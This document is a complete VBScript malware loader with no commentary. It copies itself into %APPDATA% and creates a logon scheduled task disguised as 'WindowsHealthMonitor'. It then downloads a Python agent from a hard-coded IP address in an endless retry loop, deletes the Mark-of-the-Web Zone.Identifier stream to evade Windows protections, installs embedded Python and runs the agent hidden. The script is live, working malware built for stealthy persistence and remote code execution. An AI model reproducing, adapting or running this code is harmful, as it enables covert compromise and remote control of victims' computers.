On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

' --- PERSISTENCE LOGIC ---
appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
work_dir = appdata & "\NinepeaksClient"
If Not fso.FolderExists(work_dir) Then fso.CreateFolder(work_dir)

perm_script = work_dir & "\health.vbs"
' Copy ourselves to a permanent location if needed
If LCase(WScript.ScriptFullName) <> LCase(perm_script) Then
    fso.CopyFile WScript.ScriptFullName, perm_script, True
End If

' Create Scheduled Task (Silently)
task_name = "WindowsHealthMonitor"
task_cmd = "schtasks /create /f /tn """ & task_name & """ /tr ""wscript.exe \\\""" & perm_script & "\\\"""" /sc onlogon /rl limited"
sh.Run task_cmd, 0, True

' --- CONFIG ---
host_url = "http://109.120.132.231"
host_ip = "109.120.132.231"

Function Download(url, target)
    On Error Resume Next
    If fso.FileExists(target) Then fso.DeleteFile(target)
    sh.Run "curl -L -k -s -o """ & target & """ """ & url & """", 0, True
    If fso.FileExists(target) Then
        If fso.GetFile(target).Size > 100 Then
            sh.Run "cmd /c del /f /q """ & target & ":Zone.Identifier""", 0, True
            Download = True: Exit Function
        End If
    End If
    Download = False
End Function

' 1. Download Agent (Infinite wait)
Do
    Randomize: rts = CStr(Fix(Timer * 1000))
    If Download(host_url & "/client.py?t=" & rts, work_dir & "\client.py") Then Exit Do
    WScript.Sleep 15000
Loop

' 2. Python Environment
py_dir = work_dir & "\python": py_exe = py_dir & "\pythonw.exe"
If Not fso.FileExists(py_exe) Then
    zip = work_dir & "\py.zip"
    If Download("https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip", zip) Then
        If Not fso.FolderExists(py_dir) Then fso.CreateFolder(py_dir)
        Set sa = CreateObject("Shell.Application")
        sa.NameSpace(py_dir).CopyHere sa.NameSpace(zip).Items(), 16
        WScript.Sleep 10000
        Set ts = fso.OpenTextFile(py_dir & "\python311._pth", 8, True)
        ts.WriteLine "import site": ts.Close
        fso.DeleteFile zip
    End If
End If

' 3. Final Run
sh.Run """" & py_exe & """ """ & work_dir & "\client.py""", 0, False
